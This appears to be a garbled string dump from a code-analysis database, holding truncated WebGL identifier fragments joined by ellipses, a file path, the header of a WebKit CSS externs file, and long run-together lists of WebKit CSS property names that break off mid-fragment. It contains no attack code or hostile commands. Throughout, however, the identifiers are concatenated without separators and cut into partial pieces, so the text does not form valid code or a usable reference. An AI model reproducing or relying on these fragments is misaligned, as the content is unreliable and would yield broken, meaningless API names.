XTURE29WebGLRe ... TURE30;WebGLRe ... XTURE30WebGLRe ... TURE31;WebGLRe ... XTURE31WebGLRe ... REPEAT;WebGLRe ... .REPEATWebGLRe ... O_EDGE;WebGLRe ... TO_EDGEWebGLRe ... _REPEATWebGLRe ... T_VEC2;WebGLRe ... AT_VEC2WebGLRe ... T_VEC3;WebGLRe ... AT_VEC3WebGLRe ... T_VEC4;WebGLRe ... AT_VEC4WebGLRe ... NT_VEC2WebGLRe ... NT_VEC3WebGLRe ... NT_VEC4WebGLRe ... t.BOOL;WebGLRe ... xt.BOOLWebGLRe ... L_VEC2;WebGLRe ... OL_VEC2WebGLRe ... L_VEC3;WebGLRe ... OL_VEC3WebGLRe ... L_VEC4;WebGLRe ... OL_VEC4WebGLRe ... T_MAT2;WebGLRe ... AT_MAT2WebGLRe ... T_MAT3;WebGLRe ... AT_MAT3WebGLRe ... T_MAT4;WebGLRe ... AT_MAT4WebGLRe ... LER_2D;WebGLRe ... PLER_2DWebGLRe ... R_CUBE;WebGLRe ... ER_CUBEWebGLRe ... NABLED;WebGLRe ... ENABLEDVERTEX_ ... ENABLEDWebGLRe ... Y_SIZE;WebGLRe ... AY_SIZEVERTEX_ ... AY_SIZEWebGLRe ... STRIDE;WebGLRe ... _STRIDEVERTEX_ ... _STRIDEWebGLRe ... Y_TYPE;WebGLRe ... AY_TYPEVERTEX_ ... AY_TYPEWebGLRe ... ALIZED;WebGLRe ... MALIZEDVERTEX_ ... MALIZEDWebGLRe ... OINTER;WebGLRe ... POINTERVERTEX_ ... POINTERVERTEX_ ... BINDINGWebGLRe ... FORMAT;WebGLRe ... _FORMATIMPLEME ... _FORMATWebGLRe ... D_TYPE;WebGLRe ... AD_TYPEIMPLEME ... AD_TYPEWebGLRe ... _FLOAT;WebGLRe ... W_FLOATWebGLRe ... M_FLOATWebGLRe ... H_FLOATWebGLRe ... OW_INT;WebGLRe ... LOW_INTWebGLRe ... UM_INT;WebGLRe ... IUM_INTWebGLRe ... GH_INT;WebGLRe ... IGH_INTWebGLRe ... EBUFFERWebGLRe ... RBUFFERWebGLRe ... .RGBA4;WebGLRe ... t.RGBA4WebGLRe ... GB5_A1;WebGLRe ... RGB5_A1WebGLRe ... RGB565;WebGLRe ... .RGB565WebGLRe ... NENT16;WebGLRe ... ONENT16WebGLRe ... _INDEX;WebGLRe ... L_INDEXWebGLRe ... INDEX8;WebGLRe ... _INDEX8WebGLRe ... TENCIL;WebGLRe ... STENCILWebGLRe ... R_WIDTHWebGLRe ... HEIGHT;WebGLRe ... _HEIGHTRENDERB ... _FORMATWebGLRe ... D_SIZE;WebGLRe ... ED_SIZERENDERB ... ED_SIZEWebGLRe ... N_SIZE;WebGLRe ... EN_SIZERENDERB ... EN_SIZEWebGLRe ... UE_SIZERENDERB ... UE_SIZEWebGLRe ... A_SIZE;WebGLRe ... HA_SIZERENDERB ... HA_SIZEWebGLRe ... H_SIZE;WebGLRe ... TH_SIZERENDERB ... TH_SIZEWebGLRe ... L_SIZE;WebGLRe ... IL_SIZERENDERB ... IL_SIZEWebGLRe ... T_TYPE;WebGLRe ... CT_TYPEFRAMEBU ... CT_TYPEWebGLRe ... T_NAME;WebGLRe ... CT_NAMEFRAMEBU ... CT_NAMEWebGLRe ... _LEVEL;WebGLRe ... E_LEVELFRAMEBU ... E_LEVELWebGLRe ... P_FACE;WebGLRe ... AP_FACEFRAMEBU ... AP_FACEWebGLRe ... HMENT0;WebGLRe ... CHMENT0WebGLRe ... CHMENT;WebGLRe ... ACHMENTDEPTH_S ... ACHMENTWebGLRe ... t.NONE;WebGLRe ... xt.NONEWebGLRe ... MPLETE;WebGLRe ... OMPLETEFRAMEBU ... ACHMENTWebGLRe ... NSIONS;WebGLRe ... ENSIONSFRAMEBU ... ENSIONSWebGLRe ... PORTED;WebGLRe ... PPORTEDFRAMEBU ... PPORTEDMAX_REN ... ER_SIZEINVALID ... ERATIONWebGLRe ... _WEBGL;WebGLRe ... Y_WEBGLWebGLRe ... A_WEBGLUNPACK_ ... A_WEBGLWebGLRe ... T_WEBGLWebGLRe ... N_WEBGLUNPACK_ ... N_WEBGLBROWSER ... T_WEBGLWebGLRe ... ototypeWebGLRe ... e.LINESWebGLRe ... e.ZERO;WebGLRe ... pe.ZEROWebGLRe ... pe.ONE;WebGLRe ... ype.ONEWebGLRe ... e.FRONTWebGLRe ... e.BACK;WebGLRe ... pe.BACKWebGLRe ... e.BLENDWebGLRe ... ype.CW;WebGLRe ... type.CWWebGLRe ... pe.CCW;WebGLRe ... ype.CCWWebGLRe ... e.BYTE;WebGLRe ... pe.BYTEWebGLRe ... e.SHORTWebGLRe ... pe.INT;WebGLRe ... ype.INTWebGLRe ... e.FLOATWebGLRe ... e.ALPHAWebGLRe ... pe.RGB;WebGLRe ... ype.RGBWebGLRe ... e.RGBA;WebGLRe ... pe.RGBAWebGLRe ... e.NEVERWebGLRe ... e.LESS;WebGLRe ... pe.LESSWebGLRe ... e.EQUALWebGLRe ... e.KEEP;WebGLRe ... pe.KEEPWebGLRe ... e.INCR;WebGLRe ... pe.INCRWebGLRe ... e.DECR;WebGLRe ... pe.DECRWebGLRe ... e.BOOL;WebGLRe ... pe.BOOLWebGLRe ... e.RGBA4WebGLRe ... e.NONE;WebGLRe ... pe.NONEWebGLRe ... canvas;WebGLRe ... .canvasWebGLRe ... rWidth;WebGLRe ... erWidthWebGLRe ... Height;WebGLRe ... rHeightWebGLRe ... n() {};WebGLRe ... on() {}WebGLRe ... ributesWebGLRe ... extLostWebGLRe ... ensionsgetSupp ... ensionsWebGLRe ... me) {};WebGLRe ... ame) {}WebGLRe ... tensionWebGLRe ... re) {};WebGLRe ... ure) {}WebGLRe ... Texturefunction(texture) {}WebGLRe ... er) {};WebGLRe ... der) {}WebGLRe ... hShaderfunctio ... der) {}WebGLRe ... ocationWebGLRe ... fer) {}WebGLRe ... dBufferWebGLRe ... ebufferWebGLRe ... rbufferWebGLRe ... ha) {};WebGLRe ... pha) {}WebGLRe ... ndColorfunctio ... pha) {}WebGLRe ... de) {};WebGLRe ... ode) {}WebGLRe ... quationWebGLRe ... eparateblendEq ... eparateWebGLRe ... or) {};WebGLRe ... tor) {}WebGLRe ... endFuncWebGLRe ... ge) {};WebGLRe ... age) {}WebGLRe ... ferDataWebGLRe ... ta) {};WebGLRe ... ata) {}WebGLRe ... SubDataWebGLRe ... et) {};WebGLRe ... get) {}WebGLRe ... rStatuscheckFr ... rStatusWebGLRe ... sk) {};WebGLRe ... ask) {}WebGLRe ... e.clearWebGLRe ... arColorWebGLRe ... th) {};WebGLRe ... pth) {}WebGLRe ... arDepthfunction(depth) {}WebGLRe ... (s) {};WebGLRe ... n(s) {}WebGLRe ... StencilWebGLRe ... lorMaskWebGLRe ... eShaderfunction(shader) {}WebGLRe ... Image2Dcompres ... Image2DWebGLRe ... ht) {};WebGLRe ... ght) {}WebGLRe ... eBufferWebGLRe ... ProgramWebGLRe ... pe) {};WebGLRe ... ype) {}WebGLRe ... ullFaceWebGLRe ... am) {};WebGLRe ... ram) {}function(program) {}WebGLRe ... nc) {};WebGLRe ... unc) {}WebGLRe ... pthFuncfunction(func) {}WebGLRe ... ag) {};WebGLRe ... lag) {}WebGLRe ... pthMaskWebGLRe ... al) {};WebGLRe ... Val) {}WebGLRe ... thRangefunctio ... Val) {}WebGLRe ... gs) {};WebGLRe ... ags) {}WebGLRe ... disableWebGLRe ... ex) {};WebGLRe ... dex) {}WebGLRe ... ibArraydisable ... ibArrayWebGLRe ... nt) {};WebGLRe ... unt) {}WebGLRe ... wArraysWebGLRe ... set) {}WebGLRe ... lementsWebGLRe ... ap) {};WebGLRe ... cap) {}WebGLRe ... .enablefunction(cap) {}enableV ... ibArrayWebGLRe ... .finishWebGLRe ... e.flushframebu ... rbufferWebGLRe ... el) {};WebGLRe ... vel) {}WebGLRe ... xture2DWebGLRe ... ontFaceWebGLRe ... eMipmapWebGLRe ... eAttribWebGLRe ... UniformWebGLRe ... ShadersWebGLRe ... rameterfunction(pname) {}WebGLRe ... etErrorgetFram ... rameterWebGLRe ... InfoLoggetRend ... rameterWebGLRe ... nFormatgetShad ... nFormatWebGLRe ... rSourceWebGLRe ... on) {};WebGLRe ... ion) {}WebGLRe ... xAttribWebGLRe ... bOffsetgetVert ... bOffsetWebGLRe ... pe.hintWebGLRe ... sBufferWebGLRe ... EnabledWebGLRe ... sShaderWebGLRe ... dth) {}WebGLRe ... neWidthfunction(width) {}WebGLRe ... lStoreiWebGLRe ... ts) {};WebGLRe ... its) {}WebGLRe ... nOffsetWebGLRe ... ls) {};WebGLRe ... els) {}WebGLRe ... dPixelsfunctio ... els) {}WebGLRe ... StorageWebGLRe ... rt) {};WebGLRe ... ert) {}WebGLRe ... overageWebGLRe ... scissorWebGLRe ... ce) {};WebGLRe ... rce) {}WebGLRe ... cilFuncfunctio ... ask) {}WebGLRe ... cilMaskWebGLRe ... ss) {};WebGLRe ... ass) {}WebGLRe ... encilOpfunctio ... ass) {}WebGLRe ... ameterfWebGLRe ... ameteriWebGLRe ... ue) {};WebGLRe ... lue) {}WebGLRe ... iform1fWebGLRe ... form1fvWebGLRe ... iform1iWebGLRe ... form1ivWebGLRe ... e2) {};WebGLRe ... ue2) {}WebGLRe ... iform2fWebGLRe ... form2fvWebGLRe ... iform2iWebGLRe ... form2ivWebGLRe ... e3) {};WebGLRe ... ue3) {}WebGLRe ... iform3ffunctio ... ue3) {}WebGLRe ... form3fvWebGLRe ... iform3iWebGLRe ... form3ivWebGLRe ... e4) {};WebGLRe ... ue4) {}WebGLRe ... iform4ffunctio ... ue4) {}WebGLRe ... form4fvWebGLRe ... iform4iWebGLRe ... form4ivWebGLRe ... trix2fvWebGLRe ... trix3fvWebGLRe ... trix4fvWebGLRe ...  x) {};WebGLRe ... , x) {}WebGLRe ... ttrib1ffunction(indx, x) {}WebGLRe ... es) {};WebGLRe ... ues) {}WebGLRe ... trib1fvfunctio ... ues) {}WebGLRe ...  y) {};WebGLRe ... , y) {}WebGLRe ... ttrib2fWebGLRe ... trib2fvWebGLRe ...  z) {};WebGLRe ... , z) {}WebGLRe ... ttrib3ffunctio ... , z) {}WebGLRe ... trib3fvWebGLRe ...  w) {};WebGLRe ... , w) {}WebGLRe ... ttrib4ffunctio ... , w) {}WebGLRe ... trib4fvWebGLRe ... PointerWebGLRe ... iewportWebGLCo ... ributesWebGLCo ... .alpha;WebGLCo ... e.alphaWebGLCo ... ototypeWebGLCo ... .depth;WebGLCo ... e.depthWebGLCo ... tencil;WebGLCo ... stencilWebGLCo ... ialias;WebGLCo ... tialiasWebGLCo ... dAlpha;WebGLCo ... edAlphaWebGLCo ... Buffer;WebGLCo ... gBufferpreserv ... gBufferWebGLCo ... rmance;WebGLCo ... ormancepreferL ... ormanceWebGLCo ... Caveat;WebGLCo ... eCaveatfailIfM ... eCaveatWebGLCo ... essage;WebGLCo ... Messagefunctio ... at() {}WebGLSh ... nFormatWebGLSh ... ngeMin;WebGLSh ... angeMinWebGLSh ... ototypeWebGLSh ... ngeMax;WebGLSh ... angeMaxWebGLSh ... cision;WebGLSh ... ecisionWebGLAc ... e.size;WebGLAc ... pe.sizeWebGLAc ... ototypeWebGLAc ... e.type;WebGLAc ... pe.typeWebGLAc ... e.name;WebGLAc ... pe.nameOES_tex ... f_floatOES_tex ... AT_OES;OES_tex ... OAT_OESOES_tex ... ototypeWEBGL_l ... n() {};WEBGL_l ... on() {}WEBGL_l ... ContextWEBGL_l ... ototypeOES_sta ... vativesOES_sta ... NT_OES;OES_sta ... INT_OESOES_sta ... ototypeFRAGMEN ... INT_OESfunctio ... ES() {}WebGLVe ... jectOESOES_ver ... _objectOES_ver ... NG_OES;OES_ver ... ING_OESOES_ver ... ototypeVERTEX_ ... ING_OESOES_ver ... n() {};OES_ver ... on() {}OES_ver ... rrayOESOES_ver ... ct) {};OES_ver ... ect) {}WEBGL_d ... er_infoWEBGL_d ... _WEBGL;WEBGL_d ... R_WEBGLWEBGL_d ... ototypeUNMASKE ... R_WEBGLWEBGL_d ... er) {};WEBGL_d ... der) {}WEBGL_d ... rSourcegetTran ... rSourcefunctio ... tc() {}WEBGL_c ... re_s3tcWEBGL_c ... T1_EXT;WEBGL_c ... XT1_EXTWEBGL_c ... ototypeCOMPRES ... XT1_EXTWEBGL_c ... T3_EXT;WEBGL_c ... XT3_EXTCOMPRES ... XT3_EXTWEBGL_c ... T5_EXT;WEBGL_c ... XT5_EXTCOMPRES ... XT5_EXTOES_ele ... ex_uintfunctio ... ic() {}EXT_tex ... otropicEXT_tex ... PY_EXT;EXT_tex ... OPY_EXTEXT_tex ... ototypeTEXTURE ... OPY_EXTMAX_TEX ... OPY_EXTWEBGL_d ... 0_WEBGLCOLOR_A ... 0_WEBGLWEBGL_d ... 1_WEBGLCOLOR_A ... 1_WEBGLWEBGL_d ... 2_WEBGLCOLOR_A ... 2_WEBGLWEBGL_d ... 3_WEBGLCOLOR_A ... 3_WEBGLWEBGL_d ... 4_WEBGLCOLOR_A ... 4_WEBGLWEBGL_d ... 5_WEBGLCOLOR_A ... 5_WEBGLWEBGL_d ... 6_WEBGLCOLOR_A ... 6_WEBGLWEBGL_d ... 7_WEBGLCOLOR_A ... 7_WEBGLWEBGL_d ... 8_WEBGLCOLOR_A ... 8_WEBGLWEBGL_d ... 9_WEBGLCOLOR_A ... 9_WEBGLWEBGL_d ... S_WEBGLMAX_COL ... S_WEBGLMAX_DRA ... S_WEBGLWEBGL_d ... rs) {};WEBGL_d ... ers) {}WEBGL_d ... rsWEBGLfunction(buffers) {}functio ... ys() {}ANGLE_i ... _arraysANGLE_i ... _ANGLE;ANGLE_i ... R_ANGLEANGLE_i ... ototypeVERTEX_ ... R_ANGLEANGLE_i ... nt) {};ANGLE_i ... unt) {}ANGLE_i ... edANGLEdrawArr ... edANGLEdrawEle ... edANGLEANGLE_i ... or) {};ANGLE_i ... sor) {}ANGLE_i ... orANGLEvertexA ... orANGLE/mnt/disk1/t-namanjain/CodeQL/codeql/javascript/tools/data/externs/web/webkit_css.js
 * @fileoverview Definitions for WebKit's custom CSS properties. Copied from:
 * {@link
 * http://trac.webkit.org/browser/trunk/Source/WebCore/css/CSSPropertyNames.in}
 *
 * If you make changes to this file, notice that every property appears
 * twice: once as an uppercase name and once as a lowercase name.
 * WebKit allows both. The uppercase version is preferred.
 *
 * @externs
 * @author nicksantos@google.com (Nick Santos)
  WebKit also adds bindings for the lowercase versions of these properties.// WebK ... erties. The uppercase version is preferred.// The  ... ferred.
 * @constructor
 * @param {number} x
 * @param {number} y
 /**\n *  ... } y\n */WebkitAlignContentWebkitAlignItemsWebkitAlignSelfWebkitAnimationWebkitAnimationDelayWebkitAnimationDirectionWebkitAnimationDurationWebkitAnimationFillModeWebkitAnimationIterationCountWebkitAnimationNameWebkitAnimationPlayStateWebkitAnimationTimingFunctionWebkitAppearanceWebkitAppRegionWebkitAspectRatioWebkitBackfaceVisibilityWebkitBackgroundClipWebkitBackgroundCompositeWebkitBackgroundOriginWebkitBackgroundSizeWebkitBindingWebkitBlendModeWebkitBorderAfterWebkitBorderAfterColorWebkitBorderAfterStyleWebkitBorderAfterWidthWebkitBorderBeforeWebkitBorderBeforeColorWebkitBorderBeforeStyleWebkitBorderBeforeWidthWebkitBorderBottomLeftRadiusWebkitBorderBottomRightRadiusWebkitBorderEndWebkitBorderEndColorWebkitBorderEndStyleWebkitBorderEndWidthWebkitBorderFitWebkitBorderHorizontalSpacingWebkitBorderImageWebkitBorderRadiusWebkitBorderStartWebkitBorderStartColorWebkitBorderStartStyleWebkitBorderStartWidthWebkitBorderTopLeftRadiusWebkitBorderTopRightRadiusWebkitBorderVerticalSpacingWebkitBoxAlignWebkitBoxDecorationBreakWebkitBoxDirectionWebkitBoxFlexWebkitBoxFlexGroupWebkitBoxLinesWebkitBoxOrdinalGroupWebkitBoxOrientWebkitBoxPackWebkitBoxReflectWebkitBoxShadowWebkitBoxSizingWebkitColorCorrectionWebkitColumnAxisWebkitColumnBreakAfterWebkitColumnBreakBeforeWebkitColumnBreakInsideWebkitColumnCountWebkitColumnGapWebkitColumnProgressionWebkitColumnRuleWebkitColumnRuleColorWebkitColumnRuleStyleWebkitColumnRuleWidthWebkitColumnsWebkitColumnSpanWebkitColumnWidthWebkitDashboardRegionWebkitFilterWebkitFlexWebkitFlexBasisWebkitFlexDirectionWebkitFlexFlowWebkitFlexGrowWebkitFlexShrinkWebkitFlexWrapWebkitFlowFromWebkitFlowIntoWebkitFontSizeDeltaWebkitFontSmoothingWebkitGridColumnWebkitGridColumnsWebkitGridRowWebkitGridRowsWebkitHighlightWebkitHyphenateCharacterWebkitHyphenateLimitAfterWebkitHyphenateLimitBeforeWebkitHyphenateLimitLinesWebkitHyphensWebkitJustifyContentWebkitLineAlignWebkitLineBoxContainWebkitLineBreakWebkitLineClampWebkitLineGridWebkitLineSnapWebkitLocaleWebkitLogicalHeightWebkitLogicalWidthWebkitMarginAfterWebkitMarginAfterCollapseWebkitMarginBeforeWebkitMarginBeforeCollapseWebkitMarginBottomCollapseWebkitMarginCollapseWebkitMarginEndWebkitMarginStartWebkitMarginTopCollapseWebkitMarqueeWebkitMarqueeDirectionWebkitMarqueeIncrementWebkitMarqueeRepetitionWebkitMarqueeSpeedWebkitMarqueeStyleWebkitMaskWebkitMaskAttachmentWebkitMaskBoxImageWebkitMaskBoxImageOutsetWebkitMaskBoxImageRepeatWebkitMaskBoxImageSliceWebkitMaskBoxImageSourceWebkitMaskBoxImageWidthWebkitMaskClipWebkitMaskCompositeWebkitMaskImageWebkitMaskOriginWebkitMaskPositionWebkitMaskPositionXWebkitMaskPositionYWebkitMaskRepeatWebkitMaskRepeatXWebkitMaskRepeatYWebkitMaskSizeWebkitMatchNearestMailBlockquoteColorWebkitMaxLogicalHeightWebkitMaxLogicalWidthWebkitMinLogicalHeightWebkitMinLogicalWidthWebkitNbspModeWebkitOrderWebkitOverflowScrollingWebkitPaddingAfterWebkitPaddingBeforeWebkitPaddingEndWebkitPaddingStartWebkitPerspectiveWebkitPerspectiveOriginWebkitPerspectiveOriginXWebkitPerspectiveOriginYWebkitPrintColorAdjustWebkitRegionBreakAfterWebkitRegionBreakBeforeWebkitRegionBreakInsideWebkitRegionOverflowWebkitRtlOrderingWebkitRubyPositionWebkitShapeInsideWebkitShapeMarginWebkitShapeOutsideWebkitShapePaddingWebkitTapHighlightColorWebkitTextAlignLastWebkitTextCombineWebkitTextDecorationLineWebkitTextDecorationsInEffectWebkitTextDecorationStyleWebkitTextEmphasisWebkitTextEmphasisColorWebkitTextEmphasisPositionWebkitTextEmphasisStyleWebkitTextFillColorWebkitTextOrientationWebkitTextSecurityWebkitTextSizeAdjustWebkitTextStrokeWebkitTextStrokeColorWebkitTextStrokeWidthWebkitTransformWebkitTransformOriginWebkitTransformOriginXWebkitTransformOriginYWebkitTransformOriginZWebkitTransformStyleWebkitTransitionWebkitTransitionDelayWebkitTransitionDurationWebkitTransitionPropertyWebkitTransitionRepeatCountWebkitTransitionTimingFunctionWebkitUserDragWebkitUserModifyWebkitUserSelectWebkitWrapWebkitWrapFlowWebkitWrapThroughWebkitWritingModewebkitAlignContentwebkitAlignItemswebkitAlignSelfwebkitAnimationwebkitAnimationDelaywebkitAnimationDirectionwebkitAnimationDurationwebkitAnimationFillModewebkitAnimationIterationCountwebkitAnimationNamewebkitAnimationPlayStatewebkitAnimationTimingFunctionwebkitAppearancewebkitAppRegionwebkitAspectRatiowebkitBackfaceVisibilitywebkitBackgroundClipwebkitBackgroundCompositewebkitBackgroundOriginwebkitBackgroundSizewebkitBindingwebkitBlendModewebkitBorderAfterwebkitBorderAfterColorwebkitBorderAfterStylewebkitBorderAfterWidthwebkitBorderBeforewebkitBorderBeforeColorwebkitBorderBeforeStylewebkitBorderBeforeWidthwebkitBorderBottomLeftRadiuswebkitBorderBottomRightRadiuswebkitBorderEndwebkitBorderEndColorwebkitBorderEndStylewebkitBorderEndWidthwebkitBorderFitwebkitBorderHorizontalSpacingwebkitBorderImagewebkitBorderRadiuswebkitBorderStartwebkitBorderStartColorwebkitBorderStartStylewebkitBorderStartWidthwebkitBorderTopLeftRadiuswebkitBorderTopRightRadiuswebkitBorderVerticalSpacingwebkitBoxAlignwebkitBoxDecorationBreakwebkitBoxDirectionwebkitBoxFlexwebkitBoxFlexGroupwebkitBoxLineswebkitBoxOrdinalGroupwebkitBoxOrientwebkitBoxPackwebkitBoxReflectwebkitBoxShadowwebkitBoxSizingwebkitColorCorrectionwebkitColumnAxiswebkitColumnBreakAfterwebkitColumnBreakBeforewebkitColumnBreakInsidewebkitColumnCountwebkitColumnGapwebkitColumnProgressionwebkitColumnRulewebkitColumnRuleColorwebkitColumnRuleStylewebkitColumnRuleWidthwebkitColumnswebkitColumnSpanwebkitColumnWidthwebkitDashboardRegionwebkitFilterwebkitFlexwebkitFlexBasiswebkitFlexDirectionwebkitFlexFlowwebkitFlexGrowwebkitFlexShrinkwebkitFlexWrapwebkitFlowFromwebkitFlowIntowebkitFontSizeDeltawebkitFontSmoothingwebkitGridColumnwebkitGridColumnswebkitGridRowwebkitGridRowswebkitHighlightwebkitHyphenateCharacterwebkitHyphenateLimitAfterwebkitHyphenateLimitBeforewebkitHyphenateLimitLineswebkitHyphenswebkitJustifyContentwebkitLineAlignwebkitLineBoxContainwebkitLineBreakwebkitLineClampwebkitLineGridwebkitLineSnapwebkitLocalewebkitLogicalHeightwebkitLogicalWidthwebkitMarginAfterwebkitMarginAfterCollapsewebkitMarginBeforewebkitMarginBeforeCollapsewebkitMarginBottomCollapsewebkitMarginCollapsewebkitMarginEndwebkitMarginStartwebkitMarginTopCollapsewebkitMarqueewebkitMarqueeDirectionwebkitMarqueeIncrementwebkitMarqueeRepetitionwebkitMarqueeSpeedwebkitMarqueeStylewebkitMaskwebkitMaskAttachmentwebkitMaskBoxImagewebkitMaskBoxImageOutsetwebkitMaskBoxImageRepeatwebkitMaskBoxImageSlicewebkitMaskBoxImageSourcewebkitMaskBoxImageWidthwebkitMaskClipwebkitMaskCompositewebkitMaskImagewebkitMaskOriginwebkitMaskPositionwebkitMaskPositionXwebkitMaskPositionYwebkitMaskRepeatwebkitMaskRepeatXwebkitMaskRepeatYwebkitMaskSizewebkitMatchNearestMailBlockquoteColorwebkitMaxLogicalHeightwebkitMaxLogicalWidthwebkitMinLogicalHeightwebkitMinLogicalWidthwebkitNbspModewebkitOrderwebkitOverflowScrollingwebkitPaddingAfterwebkitPaddingBeforewebkitPaddingEndwebkitPaddingStartwebkitPerspectivewebkitPerspectiveOriginwebkitPerspectiveOriginXwebkitPerspectiveOriginYwebkitPrintColorAdjustwebkitRegionBreakAfterwebkitRegionBreakBeforewebkitRegionBreakInsidewebkitRegionOverflowwebkitRtlOrderingwebkitRubyPositionwebkitShapeInsidewebkitShapeMarginwebkitShapeOutsidewebkitShapePaddingwebkitTapHighlightColorwebkitTextAlignLastwebkitTextCombinewebkitTextDecorationLinewebkitTextDecorationsInEffectwebkitTextDecorationStylewebkitTextEmphasiswebkitTextEmphasisColorwebkitTextEmphasisPositionwebkitTextEmphasisStylewebkitTextFillColorwebkitTextOrientationwebkitTextSecuritywebkitTextSizeAdjustwebkitTextStrokewebkitTextStrokeColorwebkitTextStrokeWidthwebkitTransformwebkitTransformOriginwebkitTransformOriginXwebkitTransformOriginYwebkitTransformOriginZwebkitTransformStylewebkitTransitionwebkitTransitionDelaywebkitTransitionDurationwebkitTransitionPropertywebkitTransitionRepeatCountwebkitTransitionTimingFunctionwebkitUserDragwebkitUserModifywebkitUserSelectwebkitWrapwebkitWrapFlowwebkitWrapThroughwebkitWritingModeWebKitPointDefinitions for WebKit's custom CSS properties. Copied from:
{@link
http://trac.webkit.org/browser/trunk/Source/WebCore/css/CSSPropertyNames.in}
* If you make changes to this file, notice that every property appears
twice: once as an uppercase name and once as a lowercase name.
WebKit allows both. The uppercase version is preferred.
*CSSProp ... mation;CSSProp ... imationWebkitA ... rectionWebkitA ... urationCSSProp ... llMode;CSSProp ... illModeWebkitA ... illModeCSSProp ... onCountWebkitA ... onCountCSSProp ... onName;CSSProp ... ionNameCSSProp ... yState;CSSProp ... ayStateWebkitA ... ayStateWebkitA ... unctionCSSProp ... pRegionCSSProp ... tRatio;CSSProp ... ctRatioWebkitB ... ibilityCSSProp ... posite;CSSProp ... mpositeWebkitB ... mpositeWebkitB ... dOriginCSSProp ... ndMode;CSSProp ... endModeCSSProp ... rAfter;CSSProp ... erAfterWebkitB ... erColorWebkitB ... erStyleWebkitB ... erWidthCSSProp ... rBeforeCSSProp ... reColorWebkitB ... reColorCSSProp ... reStyleWebkitB ... reStyleCSSProp ... reWidthWebkitB ... reWidthWebkitB ... tRadiusCSSProp ... derFit;CSSProp ... rderFitWebkitB ... SpacingWebkitB ... rtColorWebkitB ... rtStyleWebkitB ... rtWidthCSSProp ... nBreak;CSSProp ... onBreakWebkitB ... onBreakCSSProp ... xGroup;CSSProp ... exGroupCSSProp ... xLines;CSSProp ... oxLinesWebkitB ... alGroupCSSProp ... eflect;CSSProp ... ReflectWebkitC ... rectionCSSProp ... mnAxis;CSSProp ... umnAxisWebkitC ... akAfterWebkitC ... kBeforeWebkitC ... kInsideWebkitC ... ressionWebkitC ... leColorWebkitC ... leStyleWebkitC ... leWidthCSSProp ... olumns;CSSProp ... ColumnsCSSProp ... mnSpan;CSSProp ... umnSpanCSSProp ... dRegionWebkitD ... dRegionCSSProp ... tFilterCSSProp ... itFlex;CSSProp ... kitFlexCSSProp ... owFrom;CSSProp ... lowFromCSSProp ... owInto;CSSProp ... lowIntoCSSProp ... eDelta;CSSProp ... zeDeltaCSSProp ... othing;CSSProp ... oothingCSSProp ... Column;CSSProp ... dColumnCSSProp ... ridRow;CSSProp ... GridRowCSSProp ... idRows;CSSProp ... ridRowsCSSProp ... hlight;CSSProp ... ghlightCSSProp ... racter;CSSProp ... aracterWebkitH ... aracterCSSProp ... tAfter;CSSProp ... itAfterWebkitH ... itAfterCSSProp ... tBeforeWebkitH ... tBeforeCSSProp ... tLines;CSSProp ... itLinesWebkitH ... itLinesCSSProp ... yphens;CSSProp ... HyphensCSSProp ... eAlign;CSSProp ... neAlignCSSProp ... ontain;CSSProp ... ContainCSSProp ... eClamp;CSSProp ... neClampCSSProp ... neGrid;CSSProp ... ineGridCSSProp ... neSnap;CSSProp ... ineSnapCSSProp ... Locale;CSSProp ... tLocaleCSSProp ... alWidthCSSProp ... nAfter;CSSProp ... inAfterWebkitM ... ollapseCSSProp ... nBeforeCSSProp ... arquee;CSSProp ... MarqueeWebkitM ... rectionWebkitM ... crementCSSProp ... tition;CSSProp ... etitionWebkitM ... etitionCSSProp ... eSpeed;CSSProp ... eeSpeedCSSProp ... eeStyleCSSProp ... itMask;CSSProp ... kitMaskCSSProp ... xImage;CSSProp ... oxImageWebkitM ... eOutsetWebkitM ... eRepeatWebkitM ... geSliceWebkitM ... eSourceWebkitM ... geWidthCSSProp ... skClip;CSSProp ... askClipCSSProp ... kImage;CSSProp ... skImageCSSProp ... kOriginCSSProp ... kRepeatCSSProp ... epeatX;CSSProp ... RepeatXCSSProp ... epeatY;CSSProp ... RepeatYCSSProp ... skSize;CSSProp ... askSizeCSSProp ... teColorWebkitM ... teColorWebkitM ... lHeightWebkitM ... alWidthCSSProp ... spMode;CSSProp ... bspModeCSSProp ... tOrder;CSSProp ... itOrderCSSProp ... olling;CSSProp ... rollingWebkitO ... rollingCSSProp ... gAfter;CSSProp ... ngAfterCSSProp ... gBeforeWebkitP ... eOriginCSSProp ... riginX;CSSProp ... OriginXWebkitP ... OriginXCSSProp ... riginY;CSSProp ... OriginYWebkitP ... OriginYCSSProp ... rAdjustWebkitP ... rAdjustWebkitR ... akAfterWebkitR ... kBeforeWebkitR ... kInsideCSSProp ... dering;CSSProp ... rderingCSSProp ... eInsideCSSProp ... Margin;CSSProp ... eMarginCSSProp ... utside;CSSProp ... OutsideCSSProp ... PaddingWebkitT ... htColorCSSProp ... ombine;CSSProp ... CombineCSSProp ... onLine;CSSProp ... ionLineWebkitT ... ionLineCSSProp ... Effect;CSSProp ... nEffectWebkitT ... nEffectCSSProp ... nStyle;CSSProp ... onStyleWebkitT ... onStyleCSSProp ... phasis;CSSProp ... mphasisCSSProp ... sColor;CSSProp ... isColorWebkitT ... isColorWebkitT ... ositionCSSProp ... sStyle;CSSProp ... isStyleWebkitT ... isStyleCSSProp ... lColor;CSSProp ... llColorCSSProp ... tation;CSSProp ... ntationWebkitT ... ntationCSSProp ... curity;CSSProp ... ecurityCSSProp ... Stroke;CSSProp ... tStrokeCSSProp ... keColorWebkitT ... keColorCSSProp ... keWidthWebkitT ... keWidthWebkitT ... mOriginWebkitT ... OriginXWebkitT ... OriginYCSSProp ... riginZ;CSSProp ... OriginZWebkitT ... OriginZWebkitT ... onDelayWebkitT ... urationWebkitT ... ropertyCSSProp ... tCount;CSSProp ... atCountWebkitT ... atCountWebkitT ... unctionCSSProp ... erDrag;CSSProp ... serDragCSSProp ... itWrap;CSSProp ... kitWrapCSSProp ... apFlow;CSSProp ... rapFlowCSSProp ... hrough;CSSProp ... ThroughwebkitA ... rectionwebkitA ... urationwebkitA ... illModewebkitA ... onCountwebkitA ... ayStatewebkitA ... unctionwebkitB ... ibilitywebkitB ... mpositewebkitB ... dOriginwebkitB ... erColorwebkitB ... erStylewebkitB ... erWidthwebkitB ... reColorwebkitB ... reStylewebkitB ... reWidthwebkitB ... tRadiuswebkitB ... SpacingwebkitB ... rtColorwebkitB ... rtStylewebkitB ... rtWidthwebkitB ... onBreakwebkitB ... alGroupwebkitC ... rectionwebkitC ... akAfterwebkitC ... kBeforewebkitC ... 